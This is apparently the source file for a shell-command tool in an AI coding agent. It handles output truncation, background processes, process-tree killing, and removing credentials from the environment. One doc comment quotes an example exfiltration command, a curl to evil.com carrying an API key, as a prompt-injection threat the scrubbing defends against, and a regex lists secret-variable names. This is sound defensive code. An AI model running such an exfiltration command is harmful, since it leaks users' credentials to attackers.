import { spawn } from "node:child_process"
import { unlink } from "node:fs/promises"
import { openArtifact } from "../artifacts.ts"
import type { ToolDef } from "../providers/types.ts"

const DEFAULT_TIMEOUT_MS = 120_000
const MAX_OUTPUT = 30_000
// Leaves room for the truncation marker so a clamped body still fits MAX_OUTPUT
// and is not truncated a second time by the tool runner.
const HALF = (MAX_OUTPUT - 64) / 2
const KILL_GRACE_MS = 3_000
const SECRET_ENV = /API_KEY|TOKEN|SECRET|PASSWORD/i

function clamp(s: string): string {
	if (s.length <= MAX_OUTPUT) return s
	const dropped = s.length - HALF * 2
	return `${s.slice(0, HALF)}\n[... ${dropped} characters truncated ...]\n${s.slice(-HALF)}`
}

/**
 * Trims while the command is still running. Buffering everything and clamping at
 * exit means `yes` or a runaway build log exhausts the heap before anyone can
 * read a byte of it, so the head is frozen once it is full and the tail is a
 * ring that keeps only the last HALF characters.
 */
class Capture {
	private head = ""
	private tail = ""
	private dropped = 0

	push(chunk: string): void {
		if (this.head.length < HALF) {
			const room = HALF - this.head.length
			this.head += chunk.slice(0, room)
			chunk = chunk.slice(room)
			if (chunk === "") return
		}
		if (chunk.length > HALF) {
			this.dropped += chunk.length - HALF
			chunk = chunk.slice(-HALF)
		}
		this.tail += chunk
		if (this.tail.length > HALF) {
			const cut = this.tail.length - HALF
			this.dropped += cut
			this.tail = this.tail.slice(cut)
		}
	}

	text(artifact?: string): string {
		if (this.dropped === 0) return this.head + this.tail
		const marker = `\n[... ${this.dropped} characters truncated${artifact ? `; full output: ${artifact}` : ""} ...]\n`
		const half = Math.floor((MAX_OUTPUT - marker.length) / 2)
		return `${this.head.slice(0, half)}${marker}${this.tail.slice(-half)}`
	}
}

/**
 * The command runs with the user's shell but not with the user's keys: a prompt
 * injection that talks the model into `curl evil.com?k=$ANTHROPIC_API_KEY` then
 * has nothing to send.
 */
function safeEnv(): NodeJS.ProcessEnv {
	const out: NodeJS.ProcessEnv = {}
	for (const [key, value] of Object.entries(process.env)) {
		if (SECRET_ENV.test(key)) continue
		out[key] = value
	}
	return out
}

/**
 * Scrubbing the inherited environment is not enough, because the shell is a
 * login shell: `~/.bashrc` and `/etc/profile` run before the command does, and
 * the usual way to hold an API key is to export it from exactly there. So the
 * same names are unset once more, after the profile has had its say.
 */
const SCRUB = "unset $(compgen -e | grep -iE 'API_KEY|TOKEN|SECRET|PASSWORD') 2>/dev/null || true"

/**
 * A dev server, a watcher, or a long build has no exit code to wait for, and
 * waiting for one is how the loop dies at the 600 second ceiling. Backgrounding
 * turns it into a file instead: the command keeps running, and the agent reads
 * the log whenever it wants to know what happened. That closes the feedback
 * loop without an eighth tool, because it is the same command either way.
 */
async function startBackground(cmd: string, cwd: string): Promise<string> {
	const log = await openArtifact(cwd, "bash")
	return new Promise((resolve, reject) => {
		const child = spawn("bash", ["-lc", `${SCRUB}\n${cmd}`], {
			cwd,
			stdio: ["ignore", log.handle.fd, log.handle.fd],
			detached: true,
			env: safeEnv(),
		})
		child.once("error", async (err) => {
			await log.handle.close().catch(() => {})
			await unlink(log.absolute).catch(() => {})
			reject(err)
		})
		child.once("spawn", () => {
			void log.handle.close().then(() => {
				child.unref()
				resolve([
					`Started in the background as pid ${child.pid}.`,
					`Output is appended to: ${log.relative}`,
					"Read it with read_file. It is not killed when this turn ends; kill the pid when you are done with it.",
				].join("\n"))
			}, async (err) => {
				await unlink(log.absolute).catch(() => {})
				reject(err)
			})
		})
	})
}

export const bashTool: ToolDef = {
	name: "bash",
	description:
		"Run a shell command in the workspace root. Use for builds, tests, git, and package managers. Do not use it to read or edit files; read_file, glob, grep, and edit_file are faster and produce cleaner output. Commands time out after 120 seconds. Set background to true for a command that does not finish on its own, such as a dev server or a file watcher: it returns a log path immediately and keeps running, and you read that log with read_file to see what it did. Environment variables holding credentials are removed, so the command cannot read an API key.",
	readOnly: false,
	schema: {
		type: "object",
		properties: {
			cmd: { type: "string", description: "The command line to run." },
			timeout_ms: { type: "integer", description: "Timeout in milliseconds. Defaults to 120000." },
			background: {
				type: "boolean",
				description:
					"Run without waiting and return a log file path. Use for servers and watchers, never for a command whose exit code you need.",
			},
		},
		required: ["cmd"],
	},
	display: (input: { background?: boolean }) => input.background ? { summary: "background" } : { exitCode: 0 },
	async run(input: { cmd: string; timeout_ms?: number; background?: boolean }, ctx) {
		if (input.background) return startBackground(input.cmd, ctx.cwd)
		const log = await openArtifact(ctx.cwd, "bash")
		return new Promise<string>((resolvePromise, reject) => {
			const timeout = Math.min(input.timeout_ms ?? DEFAULT_TIMEOUT_MS, 600_000)
			const child = spawn("bash", ["-lc", `${SCRUB}\n${input.cmd}`], {
				cwd: ctx.cwd,
				stdio: ["ignore", "pipe", "pipe"],
				// Its own process group, so a signal reaches the whole tree below.
				detached: true,
				env: safeEnv(),
			})

			const out = new Capture()
			const err = new Capture()
			let settled = false
			let logged = 0
			let logOpen = true
			let logFailure = ""
			let writes = Promise.resolve()
			const appendLog = (text: string) => {
				if (!logOpen || logFailure) return
				writes = writes.then(async () => {
					try {
						await log.handle.write(text)
					} catch (writeError) {
						logFailure = writeError instanceof Error ? writeError.message : String(writeError)
					}
				})
			}
			const closeLog = async (keep = false) => {
				if (!logOpen) return
				logOpen = false
				await writes
				if (!logFailure) {
					try {
						await log.handle.sync()
					} catch (syncError) {
						logFailure = syncError instanceof Error ? syncError.message : String(syncError)
					}
				}
				await log.handle.close().catch((closeError) => {
					logFailure ||= closeError instanceof Error ? closeError.message : String(closeError)
				})
				if ((!keep && logged <= MAX_OUTPUT) || logFailure) await unlink(log.absolute).catch(() => {})
			}
			const body = (alwaysReference = false) => {
				const reference = logged > MAX_OUTPUT && !logFailure ? log.relative : undefined
				const output = clamp([out.text(reference), err.text(reference)].filter(Boolean).join("\n").trimEnd())
				if (logFailure) return `${output}\n[Full output storage failed: ${logFailure}]`.trim()
				if (alwaysReference && !reference) return `${output}\n[full output: ${log.relative}]`.trim()
				return output
			}

			/**
			 * Killing only bash leaves `cmd &` grandchildren holding the pipes, so
			 * the tool never settles and axe cannot exit. The group gets SIGTERM
			 * first because a build that is asked to stop cleans up after itself.
			 */
			const killTree = () => {
				const pid = child.pid
				if (pid === undefined) return
				try {
					process.kill(-pid, "SIGTERM")
				} catch {
					child.kill("SIGTERM")
				}
				setTimeout(() => {
					try {
						process.kill(-pid, "SIGKILL")
					} catch {
						child.kill("SIGKILL")
					}
				}, KILL_GRACE_MS).unref()
			}

			const finish = (fn: () => void, keepLog = false) => {
				if (settled) return
				settled = true
				clearTimeout(timer)
				ctx.signal.removeEventListener("abort", onAbort)
				void closeLog(keepLog).then(fn)
			}

			const timer = setTimeout(() => {
				killTree()
				finish(
					() => reject(new Error(`Command timed out after ${timeout}ms.\n${body(true)}`)),
					true,
				)
			}, timeout)

			const onAbort = () => {
				killTree()
				finish(() => reject(new Error(`Command cancelled by the user.\n${body(true)}`)), true)
			}
			ctx.signal.addEventListener("abort", onAbort, { once: true })

			child.stdout.on("data", (d) => {
				const text = d.toString()
				appendLog(text)
				logged += text.length
				out.push(text)
			})
			child.stderr.on("data", (d) => {
				const text = d.toString()
				appendLog(text)
				logged += text.length
				err.push(text)
			})
			child.on("error", (e) => finish(() => reject(e)))
			child.on("close", (code) => {
				finish(() => {
					const output = body(code !== 0)
					if (code === 0) resolvePromise(output || "(exit 0, no output)")
					else reject(new Error(`exit ${code}\n${output}`))
				}, code !== 0)
			})
		})
	},
}
